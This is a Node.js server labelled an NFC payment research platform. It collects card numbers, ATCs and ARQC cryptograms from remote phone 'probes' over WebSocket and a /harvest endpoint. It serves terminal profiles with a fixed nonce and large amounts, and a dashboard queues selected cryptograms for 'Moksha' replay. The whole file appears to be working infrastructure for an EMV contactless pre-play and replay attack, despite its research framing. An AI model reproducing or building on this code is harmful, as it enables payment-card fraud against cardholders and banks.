#!/usr/bin/env node
/**
 * NFC Payment Protocol Research Platform
 *
 *   Probe   →  ws://<ip>:4444/ws   (WebSocket)
 *   Browser →  http://<ip>:4444    (Research dashboard)
 *
 *   Run:  node lab/server.js [--port 4444]
 */

'use strict';

const { DatabaseSync }  = require('node:sqlite');
const { createServer }  = require('node:http');
const dgram             = require('node:dgram');
const os                = require('node:os');
const express           = require('express');
const { WebSocketServer, OPEN } = require('ws');

// ── Config ─────────────────────────────────────────────────────────────────────
const args    = process.argv.slice(2);
const PORT    = parseInt(args[args.indexOf('--port') + 1] || '4444', 10) || 4444;
const DB_PATH = '/tmp/nfc_research.db';

// ── Local IP ───────────────────────────────────────────────────────────────────
function localIp() {
    for (const ifaces of Object.values(os.networkInterfaces())) {
        for (const i of ifaces) {
            if (i.family === 'IPv4' && !i.internal) return i.address;
        }
    }
    return '127.0.0.1';
}

// ── SQLite ─────────────────────────────────────────────────────────────────────
const db = new DatabaseSync(DB_PATH);

db.exec(`
    CREATE TABLE IF NOT EXISTS sessions (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        pan      TEXT NOT NULL,
        aid      TEXT,
        network  TEXT,
        raw_data TEXT,
        ts       INTEGER NOT NULL
    );
    CREATE TABLE IF NOT EXISTS samples (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        sess_id  INTEGER NOT NULL,
        atc      TEXT NOT NULL,
        ac       TEXT NOT NULL,
        nonce    TEXT NOT NULL,
        amount   TEXT,
        date     TEXT,
        profile  INTEGER,
        params   TEXT,
        time_ms  REAL,
        ts       INTEGER NOT NULL,
        FOREIGN KEY (sess_id) REFERENCES sessions(id)
    );
`);

for (const sql of [
    'ALTER TABLE sessions ADD COLUMN raw_data TEXT',
    'ALTER TABLE samples ADD COLUMN profile INTEGER',
    'ALTER TABLE samples ADD COLUMN params TEXT',
    'ALTER TABLE samples ADD COLUMN selected INTEGER DEFAULT 0',
]) { try { db.exec(sql); } catch {} }

function extractNonce(params) {
    if (!params) return '';
    try {
        const p = typeof params === 'string' ? JSON.parse(params) : params;
        return p['9F37'] || p['9f37'] || '';
    } catch { return ''; }
}
function extractField(params, tag) {
    if (!params) return '';
    try {
        const p = typeof params === 'string' ? JSON.parse(params) : params;
        return p[tag] || p[tag.toLowerCase()] || '';
    } catch { return ''; }
}

function dbStoreCapture(pan, aid, network, rawData, txs, ts) {
    const rawStr = typeof rawData === 'object' ? JSON.stringify(rawData) : (rawData || '');
    let sessId;
    const existing = db.prepare('SELECT id FROM sessions WHERE pan=? AND aid=?').get(pan, aid);
    if (existing) {
        sessId = existing.id;
        if (rawStr) db.prepare('UPDATE sessions SET raw_data=? WHERE id=?').run(rawStr, sessId);
    } else {
        sessId = db.prepare(
            'INSERT INTO sessions (pan,aid,network,raw_data,ts) VALUES (?,?,?,?,?)'
        ).run(pan, aid, network, rawStr, ts).lastInsertRowid;
    }
    const ins = db.prepare(
        'INSERT INTO samples (sess_id,atc,ac,nonce,amount,date,profile,params,time_ms,ts) VALUES (?,?,?,?,?,?,?,?,?,?)'
    );
    for (const tx of txs) {
        const paramsStr = typeof tx.params === 'object' ? JSON.stringify(tx.params) : (tx.params || '');
        ins.run(
            sessId,
            tx.atc   || '',
            tx.arqc  || tx.ac || '',
            extractNonce(tx.params),
            extractField(tx.params, '9F02'),
            extractField(tx.params, '9A'),
            tx.cve_id ?? null,
            paramsStr,
            tx.time_ms ?? 0,
            ts
        );
    }
    return txs.length;
}

function dbGetSessions() {
    const sessions = db.prepare('SELECT id,pan,aid,network,raw_data,ts FROM sessions ORDER BY ts DESC').all();
    return sessions.map(s => {
        let raw = {};
        try { raw = s.raw_data ? JSON.parse(s.raw_data) : {}; } catch {}
        const rows = db.prepare(
            'SELECT id,atc,ac,nonce,amount,date,profile,params,time_ms FROM samples WHERE sess_id=? ORDER BY id ASC'
        ).all(s.id);
        const samples = rows.map(r => {
            let p = {};
            try { p = r.params ? JSON.parse(r.params) : {}; } catch {}
            return { id: r.id, atc: r.atc, arqc: r.ac, un: r.nonce, amount: r.amount,
                     date: r.date, cve_id: r.profile, time_ms: r.time_ms, params: p };
        });
        return { id: s.id, pan: s.pan, aid: s.aid, network: s.network,
                 raw_data: raw, ts: s.ts, sample_count: samples.length, transactions: samples };
    });
}

function dbGetSamples() {
    return db.prepare(`
        SELECT s.pan, s.aid, t.atc AS atc_hex, t.nonce AS un_hex,
               t.ac AS arqc_hex, t.amount, t.date
        FROM samples t JOIN sessions s ON s.id=t.sess_id
        WHERE t.nonce != '' ORDER BY t.ts DESC
    `).all();
}

function dbGetReplay() {
    return db.prepare(`
        SELECT s.pan, s.aid, t.atc AS atc_hex, t.nonce AS un_hex,
               t.ac AS arqc_hex, t.amount, t.date
        FROM samples t JOIN sessions s ON s.id=t.sess_id
        WHERE t.selected=1 AND t.nonce != '' ORDER BY t.ts DESC
    `).all();
}

function dbSetSelected(ids) {
    db.exec('UPDATE samples SET selected=0');
    if (ids.length > 0) {
        const placeholders = ids.map(() => '?').join(',');
        db.prepare(`UPDATE samples SET selected=1 WHERE id IN (${placeholders})`).run(...ids);
    }
}

function dbClear() {
    db.exec('DELETE FROM samples; DELETE FROM sessions;');
}

// ── Currency map  (ISO 4217 numeric → display) ─────────────────────────────────
const CURRENCIES = {
    '0356': { symbol: '₹',    code: 'INR', decimals: 2 },
    '0840': { symbol: '$',    code: 'USD', decimals: 2 },
    '0826': { symbol: '£',    code: 'GBP', decimals: 2 },
    '0978': { symbol: '€',    code: 'EUR', decimals: 2 },
    '0036': { symbol: 'A$',   code: 'AUD', decimals: 2 },
    '0124': { symbol: 'C$',   code: 'CAD', decimals: 2 },
    '0784': { symbol: 'AED ', code: 'AED', decimals: 2 },
    '0702': { symbol: 'S$',   code: 'SGD', decimals: 2 },
    '0392': { symbol: '¥',    code: 'JPY', decimals: 0 },
    '0458': { symbol: 'RM ',  code: 'MYR', decimals: 2 },
};

function formatAmount(rawAmount, params) {
    if (!rawAmount) return '—';
    const p   = typeof params === 'string' ? (() => { try { return JSON.parse(params); } catch { return {}; } })() : (params || {});
    const cur = CURRENCIES[p['5F2A'] || p['5f2a'] || '0840'] || { symbol: '', code: '???', decimals: 2 };
    const val = parseInt(rawAmount, 10);
    if (isNaN(val) || val === 0) return '—';
    const formatted = cur.decimals === 0
        ? val.toLocaleString()
        : (val / Math.pow(10, cur.decimals)).toFixed(cur.decimals);
    return `${cur.symbol}${formatted} <span style="color:#484f58;font-size:10px">${cur.code}</span>`;
}

// ── Protocol profiles served to probes ────────────────────────────────────────
const PROFILE_CONFIG = {
    name: 'research-lab',
    cves: [
        // ── Visa ──────────────────────────────────────────────────────────────
        { id: 1, name: 'visa-inr', amount: 100000,
          mastercard_tags: {},
          visa_tags: { '9F66':'B6004000','9F37':'A1B2C3D4','9F03':'000000000000',
                       '9F35':'22','9F33':'E0F8C8','9F1A':'0356','5F2A':'0356',
                       '95':'0000000000','9C':'00' } },
        { id: 2, name: 'visa-usd', amount: 100000,
          mastercard_tags: {},
          visa_tags: { '9F66':'B6004000','9F37':'A1B2C3D4','9F03':'000000000000',
                       '9F35':'22','9F33':'E0F8C8','9F1A':'0840','5F2A':'0840',
                       '95':'0000000000','9C':'00' } },
        { id: 3, name: 'visa-gbp', amount: 100000,
          mastercard_tags: {},
          visa_tags: { '9F66':'B6004000','9F37':'A1B2C3D4','9F03':'000000000000',
                       '9F35':'22','9F33':'E0F8C8','9F1A':'0826','5F2A':'0826',
                       '95':'0000000000','9C':'00' } },
        { id: 4, name: 'visa-eur', amount: 100000,
          mastercard_tags: {},
          visa_tags: { '9F66':'B6004000','9F37':'A1B2C3D4','9F03':'000000000000',
                       '9F35':'22','9F33':'E0F8C8','9F1A':'0978','5F2A':'0978',
                       '95':'0000000000','9C':'00' } },
        // ── Mastercard ────────────────────────────────────────────────────────
        { id: 5, name: 'mc-inr', amount: 100000,
          mastercard_tags: { '9F66':'B6004000','9F37':'B2C3D4E5','9F03':'000000000000',
                             '9F35':'22','9F33':'E0F8C8','9F1A':'0356','5F2A':'0356',
                             '95':'0000000000','9C':'00' },
          visa_tags: {} },
        { id: 6, name: 'mc-usd', amount: 100000,
          mastercard_tags: { '9F66':'B6004000','9F37':'B2C3D4E5','9F03':'000000000000',
                             '9F35':'22','9F33':'E0F8C8','9F1A':'0840','5F2A':'0840',
                             '95':'0000000000','9C':'00' },
          visa_tags: {} },
        { id: 7, name: 'mc-gbp', amount: 100000,
          mastercard_tags: { '9F66':'B6004000','9F37':'B2C3D4E5','9F03':'000000000000',
                             '9F35':'22','9F33':'E0F8C8','9F1A':'0826','5F2A':'0826',
                             '95':'0000000000','9C':'00' },
          visa_tags: {} },
        { id: 8, name: 'mc-eur', amount: 100000,
          mastercard_tags: { '9F66':'B6004000','9F37':'B2C3D4E5','9F03':'000000000000',
                             '9F35':'22','9F33':'E0F8C8','9F1A':'0978','5F2A':'0978',
                             '95':'0000000000','9C':'00' },
          visa_tags: {} },
    ],
    latest_version: null
};

let clearPending = false;
function profileResponse() {
    const r = { ...PROFILE_CONFIG, clear_device: clearPending };
    clearPending = false;
    return r;
}

// ── SSE ────────────────────────────────────────────────────────────────────────
const sseClients = new Set();
function sseBroadcast(event, data) {
    const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
    for (const res of sseClients) {
        try { res.write(msg); } catch { sseClients.delete(res); }
    }
}

// ── Express routes ─────────────────────────────────────────────────────────────
const app = express();
app.use(express.json());
app.disable('x-powered-by');

app.get('/', (_req, res) => res.type('html').send(buildHtml()));

app.get('/events', (req, res) => {
    res.set({ 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache',
              'Connection': 'keep-alive', 'Access-Control-Allow-Origin': '*' });
    res.flushHeaders();
    res.write('event: ping\ndata: {}\n\n');
    sseClients.add(res);
    const hb = setInterval(() => { try { res.write('event: ping\ndata: {}\n\n'); } catch {} }, 25000);
    req.on('close', () => { clearInterval(hb); sseClients.delete(res); });
});

app.get('/api/sessions', (_req, res) => res.json(dbGetSessions()));
app.get('/api/cards',    (_req, res) => res.json(dbGetSessions()));   // compat alias
app.get('/api/samples',  (_req, res) => res.json(dbGetSamples()));
app.get('/api/harvests', (_req, res) => res.json(dbGetSamples()));    // compat alias
app.get('/api/replay',   (_req, res) => res.json(dbGetReplay()));     // Moksha pulls this

app.post('/api/select', (req, res) => {
    const ids = (req.body.ids || []).map(Number).filter(n => n > 0);
    dbSetSelected(ids);
    sseBroadcast('selection', { count: ids.length });
    console.log(`  [SELECT]  ${ids.length} transactions queued for Moksha replay`);
    res.json({ selected: ids.length });
});

app.get('/api/info', (_req, res) => {
    const ip = localIp();
    res.json({ ws_endpoint: `ws://${ip}:${PORT}/ws`,
               http_url:    `http://${ip}:${PORT}`,
               ws_clients:  wss ? wss.clients.size : 0 });
});
app.get('/me', (_req, res) => res.json(profileResponse()));

app.delete('/api/clear', (_req, res) => {
    dbClear(); clearPending = true;
    sseBroadcast('clear', {});
    wssBroadcast(JSON.stringify({ type: 'clear' }));
    res.json({ status: 'cleared' });
});

app.post('/harvest', (req, res) => {
    const { pan='', aid='', network='', raw_data='', harvested_txs, txs } = req.body || {};
    const allTxs = harvested_txs || txs || [];
    const ts     = Math.floor(Date.now() / 1000);
    const stored = dbStoreCapture(pan, aid, network, raw_data, allTxs, ts);
    console.log(`  [CAPTURE]  PAN=${pan}  txs=${stored}`);
    sseBroadcast('capture', { pan, aid, network, sample_count: stored });
    res.json({ result: 'ok', stored });
});

app.post('/update_apk', (_req, res) => res.json({ result: 'Success', update: false }));
app.options('*', (_req, res) => {
    res.set({ 'Access-Control-Allow-Origin': '*',
              'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS',
              'Access-Control-Allow-Headers': 'Content-Type' }).sendStatus(204);
});

// ── HTTP + WebSocket server ────────────────────────────────────────────────────
const server = createServer(app);
let wss;

function wssBroadcast(text) {
    for (const ws of wss.clients) {
        if (ws.readyState === OPEN) ws.send(text);
    }
}

server.listen(PORT, '0.0.0.0', () => {
    const ip = localIp();
    wss = new WebSocketServer({ server, path: '/ws' });

    wss.on('connection', (ws, req) => {
        const addr = req.socket.remoteAddress;
        console.log(`  [WS] probe connected from ${addr}`);
        sseBroadcast('ws_clients', { count: wss.clients.size });

        ws.isAlive = true;
        ws.on('pong', () => { ws.isAlive = true; });
        ws.send(JSON.stringify({ type: 'config', ...profileResponse() }));

        ws.on('message', raw => {
            let msg;
            try { msg = JSON.parse(raw.toString()); } catch { return; }
            const t = msg.type || '';

            if (t === 'harvest') {
                const { pan='', aid='', network='', raw_data='',
                        harvested_txs, txs: txsAlt } = msg;
                const txs    = harvested_txs || txsAlt || [];
                const ts     = Math.floor(Date.now() / 1000);
                const stored = dbStoreCapture(pan, aid, network, raw_data, txs, ts);
                console.log(`  [CAPTURE]  PAN=${pan}  AID=${aid}  network=${network}  samples=${stored}`);
                sseBroadcast('capture', { pan, aid, network, sample_count: stored });
                ws.send(JSON.stringify({ type: 'ack', result: 'ok', stored }));

            } else if (t === 'get_config' || t === 'hello') {
                ws.send(JSON.stringify({ type: 'config', ...profileResponse() }));
            }
        });

        ws.on('close', () => {
            console.log(`  [WS] probe disconnected from ${addr}`);
            sseBroadcast('ws_clients', { count: wss.clients.size });
        });

        ws.on('error', err => console.log(`  [WS] error from ${addr}: ${err.message}`));
    });

    const heartbeat = setInterval(() => {
        for (const ws of wss.clients) {
            if (ws.isAlive === false) { ws.terminate(); continue; }
            ws.isAlive = false;
            ws.ping();
        }
    }, 15000);
    wss.on('close', () => clearInterval(heartbeat));

    console.log();
    console.log('━'.repeat(58));
    console.log('  NFC Payment Protocol Research Platform');
    console.log();
    console.log(`  Browser  →  http://localhost:${PORT}`);
    console.log(`  Remote   →  http://${ip}:${PORT}`);
    console.log();
    console.log(`  Probe WebSocket  →  ws://${ip}:${PORT}/ws`);
    console.log(`  Auto-discovery   →  UDP broadcast:4445`);
    console.log('━'.repeat(58));
    console.log();
});

// ── UDP beacon ─────────────────────────────────────────────────────────────────
(function startBeacon() {
    const sock = dgram.createSocket('udp4');
    sock.bind(0, () => {
        sock.setBroadcast(true);
        const msg = Buffer.from(JSON.stringify({ type: 'harvest_server', port: PORT }));
        setInterval(() => {
            sock.send(msg, 0, msg.length, 4445, '255.255.255.255');
        }, 3000);
    });
})();

// ── Dashboard HTML ─────────────────────────────────────────────────────────────
function buildHtml() { return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NFC Research</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0e1a;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;padding-bottom:70px}
header{background:#161b22;border-bottom:1px solid #21262d;padding:12px 20px;display:flex;align-items:center;gap:12px}
header h1{font-size:16px;font-weight:700;color:#fff;flex:1}
.dot{width:9px;height:9px;border-radius:50%;background:#484f58;transition:background .4s}
.dot.live{background:#3fb950;box-shadow:0 0 6px #3fb950}
.hdr-btns{display:flex;gap:6px}
button{padding:5px 12px;border-radius:6px;border:1px solid #30363d;background:#21262d;color:#c9d1d9;font-size:12px;cursor:pointer;white-space:nowrap}
button:hover{background:#2d333b}
button.danger{border-color:#6e2020;color:#f85149}
button.danger:hover{background:#2d1515}
button.primary{background:#1f4d8f;border-color:#388bfd;color:#fff;font-weight:600}
button.primary:hover{background:#1f6feb}
button.sm{padding:2px 7px;font-size:10px;color:#8b949e;margin-left:4px}
.stats{display:flex;gap:10px;padding:12px 20px;background:#0d1117;border-bottom:1px solid #21262d;flex-wrap:wrap}
.sc{display:flex;align-items:baseline;gap:6px}
.sc .v{font-size:22px;font-weight:700;color:#58a6ff}
.sc .l{font-size:11px;color:#484f58;text-transform:uppercase;letter-spacing:.5px}
.sc+.sc::before{content:'';width:1px;height:28px;background:#21262d;align-self:center;margin-right:2px}
.main{padding:16px 20px;display:flex;flex-direction:column;gap:12px}
.empty{color:#484f58;font-style:italic;padding:40px;text-align:center}
.card-block{background:#161b22;border:1px solid #21262d;border-radius:10px;overflow:hidden}
.card-head{display:flex;align-items:center;gap:8px;padding:10px 14px;background:#0d1117;cursor:pointer;flex-wrap:wrap}
.card-head:hover{background:#131920}
.card-head .pan{font-family:monospace;color:#e6edf3;font-size:14px;font-weight:600;letter-spacing:1px}
.card-head .net{color:#58a6ff;font-weight:600;font-size:11px;background:#0d2044;border:1px solid #1f4d8f;padding:1px 7px;border-radius:20px}
.card-head .cnt{color:#3fb950;font-size:12px}
.card-head .ts{color:#484f58;font-size:11px;margin-left:auto}
.card-head .hd-acts{display:flex;gap:5px;margin-left:6px}
.tx-wrap{display:none}
.tx-wrap.open{display:block}
.grp-head{padding:5px 14px;font-size:11px;color:#8b949e;background:#080c14;border-top:1px solid #21262d;display:flex;align-items:center;gap:8px}
.grp-head label{display:flex;align-items:center;gap:5px;cursor:pointer;color:#58a6ff;font-weight:600}
.grp-date{color:#484f58}
table{width:100%;border-collapse:collapse;font-size:12px}
th{color:#484f58;text-align:left;padding:5px 10px;font-weight:500;border-bottom:1px solid #21262d;background:#0a0e1a;white-space:nowrap}
td{padding:5px 10px;font-family:monospace;border-bottom:1px solid #0f131c;vertical-align:middle}
tr:hover td{background:#0c1120}
tr.sel-row td{background:#0e1d35 !important}
.ac{color:#ff7b72}.nonce{color:#ffa657}.atc{color:#d2a8ff}.amt{color:#3fb950}.dim{color:#8b949e}
.tags-tog{font-size:10px;color:#484f58;cursor:pointer;text-decoration:underline}
.tags-tog:hover{color:#58a6ff}
.pblock{display:none;margin-top:4px;background:#0a0e1a;border:1px solid #21262d;border-radius:4px;padding:6px}
.pblock.open{display:block}
.pkv{display:grid;grid-template-columns:auto 1fr;gap:2px 10px;font-size:10px}
.pk{color:#484f58}.pv{color:#c9d1d9;word-break:break-all}
input[type=checkbox]{accent-color:#58a6ff;width:13px;height:13px;cursor:pointer;vertical-align:middle}
.chev{display:inline-block;transition:transform .15s;margin-right:4px;color:#484f58;font-size:11px}
.chev.open{transform:rotate(90deg)}
.sel-bar{position:fixed;bottom:0;left:0;right:0;background:#161b22;border-top:2px solid #58a6ff;padding:10px 20px;display:flex;align-items:center;gap:12px;z-index:100;transition:border-top-color .5s}
.sel-bar.hidden{display:none}
.sel-info{color:#58a6ff;font-weight:600;flex:1}
.sel-bar button.primary{padding:8px 20px;font-size:13px}
</style>
</head>
<body>
<header>
  <h1>NFC Research</h1>
  <div class="dot" id="dot"></div>
  <div class="hdr-btns">
    <button class="danger" onclick="clearAll()">🗑 Clear</button>
    <button onclick="exportAll()">⬇ Export</button>
  </div>
</header>
<div class="stats">
  <div class="sc"><span class="v" id="sSess">0</span><span class="l">Sessions</span></div>
  <div class="sc"><span class="v" id="sSamples">0</span><span class="l">Samples</span></div>
  <div class="sc"><span class="v" id="sQueue" style="color:#3fb950">0</span><span class="l">In Queue</span></div>
  <div class="sc"><span class="v" id="sLast" style="font-size:14px;color:#8b949e">—</span><span class="l">Last tap</span></div>
</div>
<div class="main">
  <div id="sessionList"><div class="empty">Waiting for card tap…</div></div>
</div>

<div id="selBar" class="sel-bar hidden">
  <span class="sel-info" id="selCount">0 selected</span>
  <button class="primary" onclick="pushToMoksha()">⚡ Push to Moksha</button>
  <button onclick="clearSel()">✕ Clear</button>
</div>

<script>
const EMV={"9F37":"Nonce","9A":"Date","9F02":"Amount","9F03":"Amt Other","9C":"Tx Type","9F1A":"Country","5F2A":"Currency","9F33":"Term Caps","9F35":"Term Type","9F66":"TTQ","95":"TVR"};
const CURR={"0356":{s:"₹",c:"INR",d:2},"0840":{s:"$",c:"USD",d:2},"0826":{s:"£",c:"GBP",d:2},"0978":{s:"€",c:"EUR",d:2},"0036":{s:"A$",c:"AUD",d:2},"0124":{s:"C$",c:"CAD",d:2},"0784":{s:"AED ",c:"AED",d:2},"0702":{s:"S$",c:"SGD",d:2},"0392":{s:"¥",c:"JPY",d:0},"0458":{s:"RM ",c:"MYR",d:2}};
function fmtAmt(raw,p){ if(!raw)return'—'; const c=CURR[p?.['5F2A']||p?.['5f2a']||'0840']||{s:'',c:'',d:2}; const v=parseInt(raw,10); if(isNaN(v)||v===0)return'—'; return c.s+(c.d===0?v.toLocaleString():(v/Math.pow(10,c.d)).toFixed(c.d))+' <span style="color:#484f58;font-size:10px">'+c.c+'</span>'; }

let sessions=[];
const selectedIds=new Set();

// ── Live update: SSE + polling fallback ───────────────────────────────────────
const es=new EventSource('/events');
es.addEventListener('capture',()=>{ pulse(); fetchSessions(); });
es.addEventListener('clear',()=>{ sessions=[]; selectedIds.clear(); render(); stats(); updateSelBar(); });
es.addEventListener('ping',()=>{});

// Poll every 4s as fallback (catches missed SSE events)
setInterval(fetchSessions, 4000);

function pulse(){
  const d=document.getElementById('dot');
  d.classList.add('live');
  clearTimeout(pulse._t);
  pulse._t=setTimeout(()=>d.classList.remove('live'),3000);
}

// ── Selection ─────────────────────────────────────────────────────────────────
function togRow(id,cb){ if(cb.checked)selectedIds.add(id);else selectedIds.delete(id); updateSelBar(); }
function togAllSess(ids,checked){
  ids.forEach(id=>checked?selectedIds.add(id):selectedIds.delete(id));
  document.querySelectorAll('.row-cb').forEach(cb=>{ if(ids.includes(+cb.dataset.id))cb.checked=checked; });
  updateSelBar();
}
function updateSelBar(){
  const bar=document.getElementById('selBar');
  document.getElementById('selCount').textContent=selectedIds.size+' transaction'+(selectedIds.size===1?'':'s')+' selected';
  document.getElementById('sQueue').textContent=selectedIds.size;
  bar.classList.toggle('hidden',selectedIds.size===0);
  document.querySelectorAll('.row-cb').forEach(cb=>{ const r=cb.closest('tr'); if(r)r.classList.toggle('sel-row',selectedIds.has(+cb.dataset.id)); });
}
function clearSel(){
  selectedIds.clear();
  document.querySelectorAll('.row-cb,.all-cb').forEach(cb=>cb.checked=false);
  updateSelBar();
}
function pushToMoksha(){
  if(!selectedIds.size)return;
  fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ids:[...selectedIds]})})
  .then(r=>r.json()).then(d=>{
    const bar=document.getElementById('selBar');
    bar.style.borderTopColor='#3fb950';
    document.getElementById('selCount').textContent='✅ '+d.selected+' pushed to Moksha';
    setTimeout(()=>{ bar.style.borderTopColor='#58a6ff'; },2500);
  });
}

// ── Render ────────────────────────────────────────────────────────────────────
function fetchSessions(){ fetch('/api/sessions').then(r=>r.json()).then(d=>{ sessions=d; render(); stats(); }); }

function render(){
  const el=document.getElementById('sessionList');
  if(!sessions.length){ el.innerHTML='<div class="empty">Waiting for card tap…</div>'; return; }
  el.innerHTML=sessions.map((s,si)=>{
    const ts=new Date(s.ts*1000).toLocaleString([],{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
    const txs=s.transactions||[];
    const allIds=JSON.stringify(txs.map(t=>t.id));
    const pan=s.pan?s.pan.replace(/(.{4})/g,'\$1 ').trim():'—';
    return \`<div class="card-block">
      <div class="card-head" onclick="tog('tx-\${si}','chev-\${si}')">
        <span class="chev" id="chev-\${si}">▶</span>
        <span class="pan">\${pan}</span>
        \${s.network?'<span class="net">'+s.network+'</span>':''}
        <span class="cnt">\${txs.length} samples</span>
        <div class="hd-acts" onclick="event.stopPropagation()">
          <button onclick="togAllSess(\${allIds},true)">☑ All</button>
          <button onclick="expSess(\${si})">⬇</button>
        </div>
        <span class="ts">\${ts}</span>
      </div>
      <div class="tx-wrap open" id="tx-\${si}">\${buildTxTable(txs,si)}</div>
    </div>\`;
  }).join('');
}

function buildTxTable(txs,si){
  if(!txs.length)return'<div class="empty">No samples</div>';
  const byGroup={}, order=[];
  txs.forEach(t=>{
    const k=(t.cve_id??'?')+'::'+(t.date||'—');
    if(!byGroup[k]){byGroup[k]=[];order.push(k);}
    byGroup[k].push(t);
  });
  let html='',abs=0;
  order.forEach(k=>{
    const rows=byGroup[k];
    const [pid,d]=k.split('::');
    const ds=d.length===6?'20'+d.slice(0,2)+'-'+d.slice(2,4)+'-'+d.slice(4,6):d;
    const gIds=JSON.stringify(rows.map(r=>r.id));
    html+=\`<div class="grp-head">
      <label><input type="checkbox" class="all-cb" onchange="togAllSess(\${gIds},this.checked)"> Profile \${pid}</label>
      <span class="grp-date">\${ds}</span>
      <span style="color:#484f58">\${rows.length} samples</span>
    </div>
    <table><thead><tr>
      <th style="width:28px"></th><th>#</th><th>Amount</th><th>ATC</th>
      <th>Nonce</th><th>ARQC</th><th>Tags</th>
    </tr></thead><tbody>\`;
    rows.forEach(t=>{
      abs++;
      html+=\`<tr>
        <td><input type="checkbox" class="row-cb" data-id="\${t.id}" onchange="togRow(\${t.id},this)"></td>
        <td class="dim">\${abs}</td>
        <td class="amt">\${fmtAmt(t.amount,t.params)}</td>
        <td class="atc">\${t.atc||'—'}</td>
        <td class="nonce">\${t.un||'—'}<button class="sm" onclick="cp('\${t.un||''}')">copy</button></td>
        <td class="ac">\${(t.arqc||'').slice(0,16)}\${t.arqc&&t.arqc.length>16?'…':''}<button class="sm" onclick="cp('\${t.arqc||''}')">copy</button></td>
        <td>\${buildTags(t.params||{},si+'-'+abs)}</td>
      </tr>\`;
    });
    html+='</tbody></table>';
  });
  return html;
}

function buildTags(p,id){
  const keys=Object.keys(p);
  if(!keys.length)return'<span class="dim">—</span>';
  const rows=keys.map(k=>'<span class="pk">'+k+(EMV[k.toUpperCase()]?' '+EMV[k.toUpperCase()]:'')+'</span><span class="pv">'+p[k]+'</span>').join('');
  return \`<span class="tags-tog" onclick="tog('\${id}')">tags</span><div class="pblock" id="\${id}"><div class="pkv">\${rows}</div></div>\`;
}

function tog(...ids){ids.forEach(id=>{const el=document.getElementById(id);if(el)el.classList.toggle('open');});}
function stats(){
  const total=sessions.reduce((s,c)=>s+(c.sample_count||0),0);
  document.getElementById('sSess').textContent=sessions.length;
  document.getElementById('sSamples').textContent=total;
  if(sessions.length)document.getElementById('sLast').textContent=new Date(sessions[0].ts*1000).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
}
function cp(t){ navigator.clipboard.writeText(t).catch(()=>{}); }
function expSess(si){ const s=sessions[si]; dl(JSON.stringify(s,null,2),'session_'+s.pan+'_'+s.ts+'.json'); }
function exportAll(){ dl(JSON.stringify(sessions,null,2),'sessions_all_'+Date.now()+'.json'); }
function dl(data,name){ const a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([data],{type:'application/json'})); a.download=name; a.click(); }
function clearAll(){ if(!confirm('Clear all sessions?'))return; fetch('/api/clear',{method:'DELETE'}).then(()=>{sessions=[];render();stats();}); }
fetchSessions();
</script>
</body>
</html>`; }
